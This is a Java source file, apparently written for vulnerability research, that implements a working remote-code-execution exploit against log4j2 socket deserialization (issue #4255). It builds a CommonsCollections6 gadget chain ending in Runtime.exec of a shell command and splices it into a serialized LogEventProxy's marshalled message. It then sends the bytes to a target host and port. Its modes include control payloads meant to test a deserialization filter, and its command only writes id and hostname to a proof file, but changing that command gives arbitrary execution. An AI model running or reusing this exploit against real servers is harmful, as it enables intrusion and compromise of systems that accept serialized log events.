import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.core.impl.Log4jLogEvent;
import org.apache.logging.log4j.message.SimpleMessage;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.Socket;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * Attacker for log4j2 issue #4255.
 *
 * Modes (args: <host> <port> <mode> <nonce>):
 *   control-evil : send EvilMessage TOP-LEVEL (positive control -> FOIS must REJECT)
 *   poc1         : send EvilMessage wrapped in a LogEventProxy (auto-trigger -> exec)
 *   control-cc   : send a pure commons-collections gadget TOP-LEVEL (control -> FOIS must REJECT)
 *   poc2         : splice the CC gadget into LogEventProxy.marshalledMessage
 *                  (NO attacker class needed on the victim -> realistic RCE)
 */
public class Attacker {

    static String proofPath;

    public static void main(String[] args) throws Exception {
        final String host = args[0];
        final int port = Integer.parseInt(args[1]);
        final String mode = args[2];
        final String nonce = args.length > 3 ? args[3] : "0000";
        proofPath = "/work/proof/PROOF_" + nonce + ".txt";
        final String[] cmd = {
            "/bin/sh", "-c",
            "id > " + proofPath + " 2>&1; " +
            "echo LOG4J-4255-RCE-" + nonce + " >> " + proofPath + "; " +
            "hostname >> " + proofPath
        };

        final byte[] payload;
        switch (mode) {
            case "control-evil": payload = serialize(new EvilMessage(cmd)); break;
            case "poc1":         payload = wrapEvil(cmd);                    break;
            case "control-cc":   payload = serialize(buildCC(cmd));         break;
            case "poc2":         payload = spliceCC(cmd, nonce);            break;
            default: throw new IllegalArgumentException("unknown mode " + mode);
        }

        try (Socket sock = new Socket(host, port); OutputStream os = sock.getOutputStream()) {
            os.write(payload);
            os.flush();
        }
        System.out.println("[attacker] mode=" + mode + " wrote " + payload.length
                + " bytes to " + host + ":" + port + " (fire-and-forget)");
    }

    // ---- PoC-1: EvilMessage carried by a real Log4jLogEvent (uses log4j's own writeReplace) ----
    static byte[] wrapEvil(String[] cmd) throws Exception {
        Log4jLogEvent event = Log4jLogEvent.newBuilder()
                .setLoggerName("attacker").setLoggerFqcn("x")
                .setLevel(Level.INFO).setTimeMillis(System.currentTimeMillis())
                .setMessage(new EvilMessage(cmd)).build();
        return serialize(event); // writeReplace -> LogEventProxy -> marshall(EvilMessage)
    }

    // ---- PoC-2: splice a pure-CC gadget into a benign LogEventProxy's MarshalledObject ----
    static byte[] spliceCC(String[] cmd, String nonce) throws Exception {
        String marker = "SPLICE_MARKER_4255_" + nonce + "_"
                + "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"; // long+unique for a safe search
        SimpleMessage benignInner = new SimpleMessage(marker);

        Log4jLogEvent benign = Log4jLogEvent.newBuilder()
                .setLoggerName("attacker").setLoggerFqcn("x")
                .setLevel(Level.INFO).setTimeMillis(System.currentTimeMillis())
                .setMessage(benignInner).build();

        byte[] template    = serialize(benign);         // LogEventProxy; marshalledMessage holds serialize(benignInner)
        byte[] innerBenign = serialize(benignInner);    // exactly what MarshalledObject.objBytes contains
        byte[] cc          = serialize(buildCC(cmd));   // pure commons-collections + JRE graph

        int k = indexOf(template, innerBenign, 0);
        if (k < 0) throw new RuntimeException("PoC-2 splice: benign inner bytes not found in template");
        int lenPos = k - 4;
        int oldLen = readInt(template, lenPos);
        if (oldLen != innerBenign.length)
            throw new RuntimeException("PoC-2 splice: length prefix mismatch " + oldLen + " != " + innerBenign.length);

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        out.write(template, 0, lenPos);
        writeInt(out, cc.length);
        out.write(cc, 0, cc.length);
        int after = k + oldLen;
        out.write(template, after, template.length - after);
        System.out.println("[attacker] PoC-2 spliced objBytes at offset " + k
                + " (benign " + oldLen + "B -> cc " + cc.length + "B); no attacker class on victim");
        return out.toByteArray();
    }

    // ---- standard CommonsCollections6 chain (all classes ship in commons-collections 3.1-3.2.1) ----
    static Object buildCC(String[] cmd) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String[].class},
                        new Object[]{cmd})
        };
        // Build the graph with a harmless chain so nothing fires locally, then swap in the real one.
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet set = new HashSet(1);
        set.add(entry);
        lazyMap.remove("foo"); // remove the key polluted by TiedMapEntry.hashCode() during add
        setField(chain, "iTransformers", transformers);
        return set; // top-level java.util.HashSet -> allowed by FOIS; TiedMapEntry inside -> not
    }

    // ---- helpers ----
    static byte[] serialize(Object o) throws Exception {
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bout)) { oos.writeObject(o); }
        return bout.toByteArray();
    }
    static void setField(Object obj, String name, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }
    static int indexOf(byte[] hay, byte[] needle, int from) {
        outer:
        for (int i = from; i <= hay.length - needle.length; i++) {
            for (int j = 0; j < needle.length; j++) if (hay[i + j] != needle[j]) continue outer;
            return i;
        }
        return -1;
    }
    static int readInt(byte[] b, int p) {
        return ((b[p]&0xff)<<24)|((b[p+1]&0xff)<<16)|((b[p+2]&0xff)<<8)|(b[p+3]&0xff);
    }
    static void writeInt(ByteArrayOutputStream o, int v) {
        o.write((v>>>24)&0xff); o.write((v>>>16)&0xff); o.write((v>>>8)&0xff); o.write(v&0xff);
    }
}
